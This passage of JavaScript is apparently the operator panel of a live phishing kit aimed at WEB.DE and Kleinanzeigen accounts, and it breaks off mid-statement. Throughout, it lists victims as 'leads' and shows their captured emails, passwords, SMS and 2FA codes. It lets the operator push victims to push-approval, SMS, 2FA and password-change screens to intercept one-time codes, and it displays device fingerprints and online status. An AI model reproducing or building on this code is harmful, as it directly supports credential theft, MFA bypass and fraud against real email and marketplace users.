/** GMW Admin — logic for admin.html (admin panel). */
(function () {
  'use strict';

  function authFetch(url, options) {
    options = options || {};
    options.headers = options.headers || {};
    if (!options.credentials) options.credentials = 'same-origin';
    return fetch(url, options).then(function (response) {
      if (response && (response.status === 401 || response.status === 403)) {
        window.location.href = '/admin-login';
      }
      return response;
    });
  }

  function escapeHtml(s) {
    if (s == null) return '';
    var div = document.createElement('div');
    div.textContent = s;
    return div.innerHTML;
  }

  /** Строка события в блоке Events (nodeName: 'li' в списке или 'div' внутри свёртки). */
  function buildDetailEventNode(ev, isLatest, nodeName) {
    var at = '';
    if (ev.at) {
      try { at = new Date(ev.at).toLocaleTimeString('ru-RU', { hour12: false }); } catch (_) {}
    }
    var row = document.createElement(nodeName || 'li');
    row.className = 'event-item' + (isLatest ? ' event-item--latest' : '') + (ev.kind === 'log' ? ' ws-log-line' : '');
    row.innerHTML = '<span class="event-time">' + escapeHtml(at) + '</span>' +
      '<div class="event-main-col"><span class="event-text">→ ' + escapeHtml(ev.label || '') + '</span>' +
      (ev.detail ? '<span class="event-detail">' + escapeHtml(ev.detail) + '</span>' : '') + '</div>';
    return row;
  }

  /**
   * Единый UI-Kit для модалок Config / Fingerprint (тёмная панель в admin.css .admin-modal-root).
   * Автовысота monospace-полей без двойного скролла.
   */
  var AdminModalKit = (function () {
    var SELECTOR_CODE = '#config-proxies-text, #config-email-html';
    function maxEditorHeightPx() {
      return Math.floor(window.innerHeight * 0.5);
    }
    function syncOneTextarea(ta) {
      if (!ta || ta.nodeName !== 'TEXTAREA') return;
      ta.style.overflowY = 'hidden';
      ta.style.height = 'auto';
      var maxH = maxEditorHeightPx();
      var next = Math.max(ta.scrollHeight + 2, 72);
      ta.style.height = Math.min(next, maxH) + 'px';
      ta.style.overflowY = next > maxH ? 'auto' : 'hidden';
    }
    function bindAutoGrow(ta) {
      if (!ta || ta.nodeName !== 'TEXTAREA') return;
      if (ta.getAttribute('data-admin-autogrow') === '1') return;
      ta.setAttribute('data-admin-autogrow', '1');
      ta.classList.add('admin-code-editor');
      function onSync() {
        syncOneTextarea(ta);
      }
      ta.addEventListener('input', onSync);
      ta.addEventListener('focus', onSync);
      window.addEventListener('resize', onSync);
      onSync();
    }
    function bindAllCodeEditors() {
      document.querySelectorAll(SELECTOR_CODE).forEach(bindAutoGrow);
    }
    function syncCodeEditorHeights() {
      document.querySelectorAll('.admin-code-editor').forEach(syncOneTextarea);
    }
    return {
      bindAllCodeEditors: bindAllCodeEditors,
      syncCodeEditorHeights: syncCodeEditorHeights,
      /** Вызов при старте админки: классы на корнях уже в разметке; цепляем автовысоту. */
      init: function () {
        bindAllCodeEditors();
      }
    };
  })();

  /** Модалка иконки ОС: общие поля + блоки telemetrySnapshots с разделителями между устройствами. */
  function buildAntiFraudModalText(d) {
    var lines = [];
    lines.push('=== Антифрод: все снимки лида ===');
    lines.push('leadId: ' + (d.leadId || '—'));
    lines.push('brand: ' + (d.brand || '—'));
    if (d.email) lines.push('email: ' + d.email);
    if (d.emailKl) lines.push('emailKl: ' + d.emailKl);
    lines.push('platform (в записи): ' + (d.platform || '—'));
    lines.push('userAgent (последний на сервере): ' + (d.userAgent || '—'));
    lines.push('ip (последний): ' + (d.ip || '—'));
    lines.push('screen: ' + (d.screenWidth != null ? d.screenWidth : '—') + ' × ' + (d.screenHeight != null ? d.screenHeight : '—'));
    lines.push('createdAt: ' + (d.createdAt || '—'));
    lines.push('lastSeenAt: ' + (d.lastSeenAt || '—'));
    lines.push('');

    var snaps = Array.isArray(d.telemetrySnapshots) && d.telemetrySnapshots.length > 0
      ? d.telemetrySnapshots
      : [];
    if (snaps.length === 0) {
      snaps = [{
        at: d.lastSeenAt || d.createdAt,
        stableFingerprintSignature: d.stableFingerprintSignature,
        deviceSignature: d.deviceSignature,
        fingerprint: d.fingerprint,
        clientSignals: d.clientSignals,
        requestMeta: d.requestMeta
      }];
    }

    var total = snaps.length;
    var si;
    for (si = 0; si < snaps.length; si++) {
      var s = snaps[si];
      if (total > 1) {
        lines.push('══════════════════════ Устройство / снимок ' + (si + 1) + ' из ' + total + ' ══════════════════════');
        lines.push('');
      }
      lines.push('время снимка: ' + (s.at || '—'));
      lines.push('stableFingerprintSignature: ' + (s.stableFingerprintSignature || '—'));
      lines.push('deviceSignature: ' + (s.deviceSignature || '—'));
      lines.push('');
      if (s.antiFraudAssessment && typeof s.antiFraudAssessment === 'object' && s.antiFraudAssessment.score != null) {
        var a = s.antiFraudAssessment;
        lines.push('--- ОЦЕНКА АНТИФРОДА (100 = лучше) ---');
        lines.push('Балл: ' + a.score + ' / ' + (a.maxScore != null ? a.maxScore : 100));
        lines.push('Уровень: ' + (a.grade || '—') + ' | штраф суммарно: ' + (a.totalPenalty != null ? a.totalPenalty : '—'));
        if (a.summary) lines.push('Итог: ' + a.summary);
        if (Array.isArray(a.flags) && a.flags.length > 0) {
          lines.push('Флаги:');
          var fi;
          for (fi = 0; fi < a.flags.length; fi++) {
            var f = a.flags[fi];
            var sev = f.severity ? '[' + f.severity + '] ' : '';
            var pts = f.points != null ? ' (−' + f.points + ')' : '';
            lines.push('  • ' + sev + (f.code || '') + pts + ' — ' + (f.message || ''));
          }
        } else {
          lines.push('Флаги: нет замечаний по правилам оценки');
        }
        lines.push('');
      } else {
        lines.push('--- ОЦЕНКА АНТИФРОДА: для этого снимка нет (старая запись до внедрения) ---');
        lines.push('');
      }
      if (s.behaviorSignals && typeof s.behaviorSignals === 'object') {
        lines.push('--- behaviorSignals (мышь, тайминги, клавиши без текста) ---');
        try {
          lines.push(JSON.stringify(s.behaviorSignals, null, 2));
        } catch (eB) {
          lines.push(String(s.behaviorSignals));
        }
        lines.push('');
      }
      if (s.fingerprint && typeof s.fingerprint === 'object') {
        lines.push('--- fingerprint (preset + viewport) ---');
        Object.keys(s.fingerprint).forEach(function (k) {
          var v = s.fingerprint[k];
          if (Array.isArray(v)) v = v.join(', ');
          else if (v === undefined || v === null) v = '—';
          lines.push(k + ': ' + v);
        });
        lines.push('');
      }
      if (s.clientSignals && typeof s.clientSignals === 'object') {
        lines.push('--- clientSignals ---');
        try {
          lines.push(JSON.stringify(s.clientSignals, null, 2));
        } catch (e1) {
          lines.push(String(s.clientSignals));
        }
        lines.push('');
      } else {
        lines.push('--- clientSignals: нет в этом снимке ---');
        lines.push('');
      }
      if (s.requestMeta && typeof s.requestMeta === 'object') {
        lines.push('--- requestMeta ---');
        try {
          lines.push(JSON.stringify(s.requestMeta, null, 2));
        } catch (e2) {
          lines.push(String(s.requestMeta));
        }
        lines.push('');
      } else {
        lines.push('--- requestMeta: нет в этом снимке ---');
        lines.push('');
      }
    }
    return lines.join('\n').replace(/\n+$/, '');
  }

  function copyToClipboard(text) {
    var t = (text || '').trim();
    if (!t) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(t).then(function () {
        showCopyFeedback();
      }).catch(function () { fallbackCopy(t); });
    } else {
      fallbackCopy(t);
    }
  }
  function fallbackCopy(text) {
    var ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try {
      document.execCommand('copy');
      showCopyFeedback();
    } catch (e) {}
    document.body.removeChild(ta);
  }
  function showCopyFeedback() {
    var toast = document.getElementById('copy-toast');
    if (!toast) {
      toast = document.createElement('div');
      toast.id = 'copy-toast';
      toast.className = 'copy-toast';
      toast.textContent = 'Copied';
      document.body.appendChild(toast);
    }
    toast.classList.add('visible');
    clearTimeout(toast._tid);
    toast._tid = setTimeout(function () { toast.classList.remove('visible'); }, 1200);
  }

  function showToast(message) {
    var toast = document.getElementById('msg-toast');
    if (!toast) {
      toast = document.createElement('div');
      toast.id = 'msg-toast';
      toast.className = 'copy-toast copy-toast--error';
      document.body.appendChild(toast);
    }
    toast.textContent = message || 'Ошибка';
    toast.classList.add('visible');
    clearTimeout(toast._tid);
    toast._tid = setTimeout(function () { toast.classList.remove('visible'); }, 3000);
  }

  /** id в JSON может быть числом или строкой; sessionStorage всегда строка — без нормализации после loadLeads() лид «пропадает» из детали. */
  function leadIdsEqual(a, b) {
    if (a == null || b == null) return false;
    return String(a) === String(b);
  }
  function normalizeLeadId(id) {
    if (id == null || id === '') return null;
    return String(id);
  }

  var leads = [];
  var selectedId = null;
  var selectedIds = {};
  var lastViewedSnapshot = {};
  /** Развёрнут ли блок Events «Показать предыдущие» для лида (ключ — String(id)). */
  var detailEventsPastExpanded = {};
  var firstLoad = true;
  var pollInterval = null;
  var ws = null;
  var wsReconnectTimer = null;
  var pollFallbackInterval = null;
  var leadsPage = 1;
  var leadsTotal = 0;
  var leadsLimit = 50;
  var statsPeriod = 'today';
  /** Отмена предыдущего GET /api/leads — иначе ответы приходят не по порядку (WS / poll) и сбрасывают страницу. */
  var leadsLoadAbort = null;

  var el = {
    countBadge: null,
    leadsList: null,
    leadEmpty: null,
    leadsPagination: null,
    leadsPaginationTop: null,
    detailPlaceholder: null,
    mainContent: null,
    detailEmail: null,
    detailPasswordCurrent: null,
    passwordHistory: null,
    detailTerminal: null,
    sessionsListWrap: null,
    statsContent: null,
    statsGrid: null
  };

  /** Как на сервере eventLabelIsWorkedMark — иначе сайдбар и /api/archive-leads-by-filter расходятся. */
  function eventLabelLooksWorked(lbl) {
    var s = String(lbl != null ? lbl : '').trim().toLowerCase();
    try { s = s.normalize('NFC'); } catch (e) {}
    if (!s) return false;
    if (s === 'отработан') return true;
    if (s.indexOf('отработан') === 0) return true;
    return s.indexOf('отработан') !== -1;
  }

  var EVENT_WORKED_TOGGLE_OFF_LABEL = 'Снята пометка оператором';

  function eventLabelLooksWorkedToggleOff(lbl) {
    var s = String(lbl != null ? lbl : '').trim().toLowerCase();
    try { s = s.normalize('NFC'); } catch (e) {}
    return s === EVENT_WORKED_TOGGLE_OFF_LABEL.toLowerCase();
  }

  /** Список слева: «Отработан» с учётом снятия пометки (с конца лога); Klein в архиве — всегда отработан. */
  function leadIsSidebarWorked(lead) {
    if (!lead) return false;
    if (lead.klLogArchived === true || lead.klLogArchived === 'true') return true;
    var events = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
    for (var i = events.length - 1; i >= 0; i--) {
      var ev = events[i];
      var lbl = ev && (ev.label != null ? ev.label : ev.text);
      if (eventLabelLooksWorkedToggleOff(lbl)) return false;
      if (eventLabelLooksWorked(lbl)) return true;
    }
    return false;
  }

  /** Тип кода в smsCodeData для UI: SMS и 2FA хранятся в одном объекте, различаем по kind или (для старых логов) по status/событиям. */
  function smsCodeDataKind(lead) {
    var d = lead && lead.smsCodeData;
    if (!d || !String(d.code || '').trim()) return null;
    var k = d.kind;
    if (k === '2fa' || k === 'sms') return k;
    var st = String(lead.status || '').toLowerCase();
    if (st === 'redirect_2fa_code') return '2fa';
    if (st === 'redirect_sms_code' || st === 'redirect_sms') return 'sms';
    var evs = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
    for (var i = evs.length - 1; i >= 0; i--) {
      var lab = String((evs[i] && (evs[i].label != null ? evs[i].label : evs[i].text)) || '').toLowerCase();
      if (lab.indexOf('ввел 2fa-код') === 0) return '2fa';
      if (lab.indexOf('ввел sms kl') === 0 || lab.indexOf('ввел sms-код') === 0 || lab.indexOf('ввел sms:') === 0) return 'sms';
    }
    return 'sms';
  }

  function getBadgeClassAndLabel(lead) {
    if (leadIsSidebarWorked(lead)) {
      return { cls: 'action-worked', label: 'Отработан' };
    }
    var status = (lead.status || 'pending').toLowerCase();
    var isKlein = lead.brand === 'klein';
    var hasPassword = (lead.password || '').trim() !== '';
    var hasPasswordKl = (lead.passwordKl || '').trim() !== '';
    var suf = isKlein ? ' Kl' : '';
    var events = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];

    function fromLastEvent(lbl) {
      if (!lbl) return null;
      if (eventLabelLooksWorkedToggleOff(lbl)) return null;
      var l = lbl.toLowerCase();
      // Единые EVENTS из server.js (EVENT_LABELS) + старые строки в логах
      if (l === 'запуск web.de' || l.indexOf('запуск web.de') === 0) return { cls: 'action-email', label: 'WEB.DE' };
      if (l === 'запуск klein' || l.indexOf('запуск klein') === 0) return { cls: 'action-change', label: 'Klein' };
      if (l === 'push') return { cls: 'action-push', label: 'Push' + suf };
      if (l.indexOf('push: таймаут') === 0) return { cls: 'action-push', label: 'Push: таймаут' };
      if (l.indexOf('push:') === 0 && l.indexOf('переотправ') !== -1) return { cls: 'action-push', label: 'Push' };
      if (l === 'sms' || l === 'sms kl') return { cls: 'action-sms', label: l === 'sms kl' ? 'Sms Kl' : 'Sms' };
      if (l === 'неверные данные' || l === 'неверные данные kl') return { cls: 'action-error', label: l.indexOf(' kl') !== -1 ? 'Неверные данные Kl' : 'Неверные данные' };
      if (l === 'неверный sms' || l === 'неверный sms kl') return { cls: 'action-error', label: l.indexOf(' kl') !== -1 ? 'Неверный SMS Kl' : 'Неверный SMS' };
      if (l === 'неверный 2fa') return { cls: 'action-error', label: 'Неверный 2FA' };
      if (l === '2fa') return { cls: 'action-sms', label: '2FA' };
      if (l.indexOf('2fa:') === 0) {
        if (l.indexOf('неверный') !== -1) return { cls: 'action-error', label: 'Неверный 2FA' };
        if (l.indexOf('таймаут') !== -1) return { cls: 'action-error', label: '2FA таймаут' };
        return { cls: 'action-sms', label: '2FA' };
      }
      if (l === 'успешный вход' || l === 'успешный вход kl') return { cls: 'action-success', label: l.indexOf(' kl') !== -1 ? 'Успех Kl' : 'Успех' };
      if (l === 'почта готова') return { cls: 'action-email-send', label: 'Send Email' };
      if (l === 'включение фильтров на почте' || l === 'фильтры включены') return { cls: 'action-email-send', label: 'Фильтры' };
      if (l === 'почта: интерфейс подготовлен') return { cls: 'action-email-send', label: 'Почта UI' };
      if (l.indexOf('web.de:') === 0) {
        if (l.indexOf('попытка входа') !== -1) return { cls: 'action-email', label: 'WEB.DE' };
        if (l.indexOf('браузер') !== -1) return { cls: 'action-email', label: 'WEB.DE' };
        if (l.indexOf('почтовый ящик') !== -1) return { cls: 'action-success', label: 'Почта' };
        if (l.indexOf('экране push') !== -1) return { cls: 'action-push', label: 'Push' + suf };
        if (l.indexOf('экране 2fa') !== -1) return { cls: 'action-sms', label: '2FA' };
        if (l.indexOf('экране sms') !== -1) return { cls: 'action-sms', label: 'Sms' + (l.indexOf(' kl') !== -1 ? ' Kl' : '') };
        return { cls: 'action-email', label: 'WEB.DE' };
      }
      if (l.indexOf('klein (скрипт):') === 0) return { cls: 'action-change', label: 'Klein' };
      if (l.indexOf('klein:') === 0) {
        if (l.indexOf('сессия почты') !== -1) return { cls: 'action-email-send', label: 'Почта→Klein' };
        if (l.indexOf('ждём') !== -1) return { cls: 'action-change', label: 'Ждём лид' };
        if (l.indexOf('лид на странице') !== -1) return { cls: 'action-change', label: 'Лид Klein' };
        if (l.indexOf('данные для входа') !== -1) return { cls: 'action-password', label: 'Креды Kl' };
        return { cls: 'action-change', label: 'Klein' };
      }
      if (l.indexOf('ввел почту kl') === 0 || l === 'email kl') return { cls: 'action-email', label: 'Email Kl' };
      if (l.indexOf('ввел почту') === 0 || l === 'email') return { cls: 'action-email', label: 'Email' };
      if (l.indexOf('ввел пароль kl') === 0 || l.indexOf('новый пароль kl') === 0 || l === 'password kl') return { cls: 'action-password', label: 'Password Kl' };
      if (l.indexOf('ввел пароль') === 0 || l.indexOf('новый пароль') === 0 || l === 'password') return { cls: 'action-password', label: 'Password' };
      if (l === 'error password') return { cls: 'action-error', label: 'Error Password' };
      if (l.indexOf('неверный пароль kl') === 0) return { cls: 'action-error', label: 'Неверный пароль Kl' };
      if (l.indexOf('неверный пароль') === 0) return { cls: 'action-error', label: 'Неверный пароль' };
      // Технический timeout long-poll (пароль не пришел от админки) не должен красить бейдж в Error SMS.
      if (l.indexOf('ошибка 408') === 0 && (l.indexOf('пароль не получен от админки') !== -1 || l.indexOf('long-poll timeout') !== -1)) {
        return { cls: 'action-email', label: isKlein ? 'Email Kl' : 'Email' };
      }
      // Ввод кода на странице SMS (server: «Ввел SMS Kl: …» / «Ввел SMS-код: …») — раньше не матчилось на «sms kl» с начала строки → бейдж падал на status=error «Неверный пароль».
      if (l.indexOf('ввел sms kl') === 0) return { cls: 'action-sms', label: 'Дал SMS Kl' };
      if (l.indexOf('ввел 2fa-код') === 0) return { cls: 'action-sms', label: 'Дал 2FA' };
      if (l.indexOf('ввел sms-код') === 0 || l.indexOf('ввел sms:') === 0) return { cls: 'action-sms', label: 'Дал SMS' };
      if (l === 'просит sms' || l.indexOf('просит sms') === 0) return { cls: 'action-sms', label: 'Просит SMS' };
      if (l.indexOf('переотправка sms') === 0) return { cls: 'action-sms', label: 'Просит SMS' };
      if (l.indexOf('ошибка') === 0 && l.indexOf('неверный 2fa') !== -1) {
        return { cls: 'action-error', label: 'Неверный 2FA' };
      }
      if (l.indexOf('ошибка') === 0 && l.indexOf('неверный sms') !== -1) {
        return { cls: 'action-error', label: isKlein ? 'Неверный SMS Kl' : 'Неверный SMS' };
      }
      if (l.indexOf('ошибка') === 0 || l.indexOf('error') === 0) return { cls: 'action-error', label: isKlein ? 'Error SMS Kl' : 'Неверный пароль' };
      if (l.indexOf('sms kl') === 0) return { cls: 'action-sms', label: 'Sms Kl' };
      if (l === 'sms' || l.indexOf('sms ') === 0) return { cls: 'action-sms', label: 'Sms' };
      if (l.indexOf('ожидание push') !== -1) return { cls: 'action-push', label: 'Push' + suf };
      if (l.indexOf('push') === 0) return { cls: 'action-push', label: 'Push' + suf };
      if (l.indexOf('успех kl') === 0) return { cls: 'action-success', label: 'Успех Kl' };
      if (l.indexOf('успех') === 0 || l.indexOf('вход удался') === 0) return { cls: 'action-success', label: isKlein ? 'Успех Kl' : 'Успех' };
      if (l.indexOf('отправлен на смену kl') === 0) return { cls: 'action-change', label: 'Отправлен на смену Kl' };
      if (l.indexOf('отправлен на смену') === 0) return { cls: 'action-change', label: 'Отправлен на смену' };
      // Config E-Mail: одна метка в логе — «Send Email» (+ старые «Email Send», «Письмо отправлено»)
      if (l === 'письмо отправлено' || (l.indexOf('письмо отправлено') !== -1 && l.indexOf('не отправилось') === -1 && l.indexOf('не удалось') === -1)) {
        return { cls: 'action-email-send', label: 'Send Email' };
      }
      if (l === 'email send' || l === 'email send kl') return { cls: 'action-email-send', label: 'Send Email' };
      if (l === 'send email' || l.indexOf('send email') === 0) return { cls: 'action-email-send', label: 'Send Email' };
      if (eventLabelLooksWorked(lbl)) return { cls: 'action-done', label: 'Отработан' };
      if (l.indexOf('нажал скачать') === 0 || l.indexOf('скачал') === 0) return { cls: 'action-download', label: 'Скачал' };
      return null;
    }

    /** Свежее событие с конца: одно только events[length-1] давало ошибку, если последняя запись без label или порядок сбит.
     * После «Снята пометка оператором» не поднимать старые «Отработан» из лога — показывать последнее действие до пометок. */
    var fromEvent = null;
    for (var ei = events.length - 1; ei >= 0 && !fromEvent; ei--) {
      var evi = events[ei];
      var evLbl = String((evi && evi.label != null ? evi.label : '') || (evi && evi.text != null ? evi.text : '') || '').trim();
      if (eventLabelLooksWorkedToggleOff(evLbl)) continue;
      if (eventLabelLooksWorked(evLbl)) continue;
      fromEvent = fromLastEvent(evLbl);
    }
    if (fromEvent) return fromEvent;

    if (status === 'show_error') return { cls: 'action-error', label: isKlein ? 'Error SMS Kl' : 'Неверный пароль' };
    if (status === 'error') return { cls: 'action-error', label: isKlein ? 'Неверный пароль Kl' : 'Неверный пароль' };
    if (status === 'show_success') return { cls: 'action-success', label: isKlein ? 'Успех Kl' : 'Успех' };
    function hasWebdeScriptSuccess(l) {
      if (!l || !Array.isArray(l.eventTerminal)) return false;
      return l.eventTerminal.some(function (ev) {
        var lbl = ev && ev.label ? String(ev.label) : '';
        if (lbl === 'Вход удался' || lbl.indexOf('Вход удался') === 0) return true;
        if (lbl === 'Успешный вход' || lbl === 'Успешный вход Kl') return true;
        return lbl.indexOf('Успешный вход') === 0;
      });
    }

    if (status === 'redirect_change_password') {
      return (lead && lead.brand === 'webde' && hasWebdeScriptSuccess(lead))
        ? { cls: 'action-success', label: isKlein ? 'Успех Kl' : 'Успех' }
        : { cls: 'action-change', label: 'Отправлен на смену' + suf };
    }
    if (status === 'redirect_sicherheit') {
      return (lead && lead.brand === 'webde' && hasWebdeScriptSuccess(lead))
        ? { cls: 'action-success', label: isKlein ? 'Успех Kl' : 'Успех' }
        : { cls: 'action-change', label: 'Sicherheit' + suf };
    }
    if (status === 'redirect_android') {
      return (lead && lead.brand === 'webde' && hasWebdeScriptSuccess(lead))
        ? { cls: 'action-success', label: isKlein ? 'Успех Kl' : 'Успех' }
        : { cls: 'action-change', label: 'Android' + suf };
    }
    if (status === 'redirect_open_on_pc') {
      return (lead && lead.brand === 'webde' && hasWebdeScriptSuccess(lead))
        ? { cls: 'action-success', label: isKlein ? 'Успех Kl' : 'Успех' }
        : { cls: 'action-change', label: 'Am pc' + suf };
    }

    if (status === 'redirect_gmx_net') return { cls: 'action-error', label: '→ Gmx' };
    if (status === 'redirect_klein_forgot') return { cls: 'action-change', label: 'Klein Passwort vergessen' };
    if (status === 'redirect_push') return { cls: 'action-push', label: 'Push' + suf };
    if (status === 'redirect_2fa_code') {
      var code2fa = (lead.smsCodeData && lead.smsCodeData.code || '').trim();
      var has2fa = !!(code2fa && smsCodeDataKind(lead) === '2fa');
      return { cls: 'action-sms', label: (has2fa ? 'Дал 2FA' : '2-FA') + suf };
    }
    if (status === 'redirect_sms_code' || status === 'redirect_sms' || (lead.smsCodeData && (lead.smsCodeData.code || '').trim() && smsCodeDataKind(lead) === 'sms')) {
      var hasSubmittedSms = !!(lead.smsCodeData && (lead.smsCodeData.code || '').trim() && smsCodeDataKind(lead) === 'sms');
      return { cls: 'action-sms', label: (hasSubmittedSms ? 'Дал SMS' : 'Sms') + suf };
    }
    if (isKlein && hasPasswordKl) return { cls: 'action-password', label: 'Password Kl' };
    if (hasPassword) return { cls: 'action-password', label: 'Password' };
    if (isKlein) return { cls: 'action-email', label: 'Email Kl' };
    return { cls: 'action-email', label: 'Email' };
  }

  /** Онлайн только при живом пульсе со страницы лида (/api/status → sessionPulseAt). lastSeenAt в файле трогается при действиях админки — его нельзя путать с «на сайте». */
  function isOnline(lead) {
    var pulse = lead && lead.sessionPulseAt;
    if (!pulse) return false;
    var t = new Date(pulse).getTime();
    if (isNaN(t)) return false;
    return (Date.now() - t) < 35 * 1000;
  }

  function statusClass(lead) {
    return isOnline(lead) ? 'session-status' : 'session-status danger';
  }

  /** Время для порядка в списке: adminListSortAt (новая сессия / снова ввёл email), иначе createdAt, иначе lastSeenAt — см. сервер. */
  function leadRecencyMs(lead) {
    if (!lead) return 0;
    var als = lead.adminListSortAt ? new Date(lead.adminListSortAt).getTime() : NaN;
    if (!isNaN(als) && als > 0) return als;
    var cr = lead.createdAt ? new Date(lead.createdAt).getTime() : NaN;
    if (!isNaN(cr) && cr > 0) return cr;
    var ls = lead.lastSeenAt ? new Date(lead.lastSeenAt).getTime() : NaN;
    return !isNaN(ls) && ls > 0 ? ls : 0;
  }

  /** Сначала по «сессии» (adminListSortAt / createdAt), затем по id. */
  function sortLeadsNewFirst(arr) {
    if (!Array.isArray(arr) || arr.length === 0) return arr;
    return arr.slice().sort(function (a, b) {
      var ta = leadRecencyMs(a);
      var tb = leadRecencyMs(b);
      if (tb !== ta) return tb - ta;
      return (b.id || '').localeCompare(a.id || '');
    });
  }

  function getPlatformIcon(platform) {
    var p = (platform || '').toLowerCase();
    if (p !== 'android' && p !== 'ios' && p !== 'windows' && p !== 'macos') return '';
    var title = p === 'android' ? 'Android' : p === 'ios' ? 'iOS' : p === 'windows' ? 'Windows' : 'macOS';
    if (p === 'windows') {
      return '<span class="platform-icon" title="' + escapeHtml(title) + '" aria-hidden="true"><svg class="platform-icon-svg" viewBox="0 0 24 24" fill="#111"><path d="M3 4.5L11 3v9H3V4.5zm10 8.5V3l11-1.5V13H13zm-10 1h8v7L3 19.5V14zm10 0h11v8.5L13 21v-7z"/></svg></span>';
    }
    if (p === 'macos') {
      return '<span class="platform-icon" title="' + escapeHtml(title) + '" aria-hidden="true"><svg class="platform-icon-svg" viewBox="0 0 32 32" fill="#000"><path d="M31,0H1A1,1,0,0,0,0,1V31a1,1,0,0,0,1,1H31a1,1,0,0,0,1-1V1A1,1,0,0,0,31,0ZM2,2H14.36C11.89,7.34,11,15.52,11,15.9a1,1,0,0,0,.25.77A1,1,0,0,0,12,17h4.89a29.9,29.9,0,0,0,.25,7c-.37,0-.75.05-1.14.05A14.07,14.07,0,0,1,5.78,19.38a1,1,0,0,0-1.4-.16,1,1,0,0,0-.16,1.41A15.87,15.87,0,0,0,16,26c.53,0,1.05,0,1.55-.08A18.35,18.35,0,0,0,19.07,30H2ZM30,30H21.39a15.57,15.57,0,0,1-1.86-4.42,15.91,15.91,0,0,0,8.25-4.95,1,1,0,1,0-1.56-1.25,14.13,14.13,0,0,1-7.09,4.24A27.91,27.91,0,0,1,19,16.15,1,1,0,0,0,18,15H13.13c.34-2.59,1.36-9.12,3.46-13H30Z"/><path d="M8,13a1,1,0,0,0,1-1V9A1,1,0,0,0,7,9v3A1,1,0,0,0,8,13Z"/><path d="M24,13a1,1,0,0,0,1-1V9a1,1,0,0,0-2,0v3A1,1,0,0,0,24,13Z"/></svg></span>';
    }
    if (p === 'android') {
      return '<span class="platform-icon" title="' + escapeHtml(title) + '" aria-hidden="true"><svg class="platform-icon-svg" viewBox="0 0 24 24" fill="#111"><path d="M7 7h10v10a2 2 0 0 1-2 2H9a2 2 0 0 1-2-2V7zm-2 2h1v7H5a1 1 0 0 1-1-1v-5a1 1 0 0 1 1-1zm14 0h1a1 1 0 0 1 1 1v5a1 1 0 0 1-1 1h-1V9zM9 4l1.2 2h3.6L15 4h1l-1.3 2.2A2 2 0 0 1 17 8H7a2 2 0 0 1 2.3-1.8L8 4h1z"/></svg></span>';
    }
    return '<span class="platform-icon" title="' + escapeHtml(title) + '" aria-hidden="true"><svg class="platform-icon-svg" viewBox="0 0 24 24" fill="#111"><path d="M16.4 13.2c0-2.6 2.1-3.8 2.2-3.9-1.2-1.8-3-2.1-3.7-2.1-1.6-.2-3.1.9-3.9.9-.8 0-2-.9-3.3-.9-1.7 0-3.3 1-4.2 2.6-1.8 3.1-.5 7.7 1.3 10.3.9 1.3 1.9 2.8 3.3 2.7 1.3-.1 1.8-.8 3.4-.8s2 .8 3.4.8c1.4 0 2.3-1.3 3.2-2.6 1-1.5 1.4-3 1.4-3.1-.1 0-2.7-1-2.7-3.9z"/><path d="M14.3 5.8c.7-.9 1.1-2 1-3.3-1 .1-2.2.7-2.9 1.6-.7.8-1.2 2-1.1 3.2 1.1.1 2.2-.5 3-1.5z"/></svg></span>';
  }

  function hasDownloaded(lead) {
    var events = lead && lead.eventTerminal ? lead.eventTerminal : [];
    for (var i = 0; i < events.length; i++) {
      if (events[i].label === 'Нажал скачать') return true;
    }
    return false;
  }

  function renderList() {
    var wrap = el.sessionsListWrap;
    var list = el.leadsList;
    var empty = el.leadEmpty;
    if (!list) return;

    list.innerHTML = '';
    if (leads.length === 0) {
      if (wrap) wrap.style.display = 'none';
      if (empty) { empty.style.display = 'block'; empty.classList.remove('hidden'); }
      if (el.countBadge) el.countBadge.textContent = '0';
      return;
    }

    if (wrap) wrap.style.display = 'block';
    if (empty) { empty.style.display = 'none'; empty.classList.add('hidden'); }
    if (el.countBadge) {
      if (leadsTotal > leadsLimit) {
        el.countBadge.textContent = leads.length + ' / ' + leadsTotal;
      } else {
        el.countBadge.textContent = String(leads.length);
      }
    }

    var ordered = sortLeadsNewFirst(leads);

    ordered.forEach(function (lead, index) {
      var num = ordered.length - index;
      var item = document.createElement('div');
      item.className = 'session-item' + (leadIdsEqual(lead.id, selectedId) ? ' active' : '') + (lead.klLogArchived === true ? ' session-item--kl-archived' : '') + (lead.adminLogArchived === true ? ' session-item--admin-archived' : '') + (leadIsSidebarWorked(lead) ? ' session-item--worked' : '');
      item.setAttribute('data-id', lead.id);

      var badge = getBadgeClassAndLabel(lead);
      var email = (lead.email || lead.emailKl || '').trim() || '—';
      var checked = selectedIds[lead.id] ? ' checked' : '';
      var platformIcon = getPlatformIcon(lead.platform);
      var platformBtnHtml = '<button type="button" class="session-os-btn" title="Антифрод: все снимки лида; при разных устройствах — блоки с разделителем" aria-label="Антифрод-снимки лида" data-id="' + escapeHtml(lead.id) + '">' + (platformIcon || '<span class="platform-icon"></span>') + '</button>';
      var brand = (lead.brand || '').toLowerCase();
      var kleinLogoUrl = (typeof window.__KLEIN_LOGO_DATAURL === 'string' && window.__KLEIN_LOGO_DATAURL) ? window.__KLEIN_LOGO_DATAURL : '/klein-logo.png';
      var brandIconHtml = brand === 'klein'
        ? '<img src="' + escapeHtml(kleinLogoUrl) + '" class="session-brand-icon session-brand-icon--klein" alt="" role="img" aria-label="Kleinanzeigen" title="Kleinanzeigen">'
        : '';
      var pastHistoryIconHtml = lead.pastHistoryTransferred
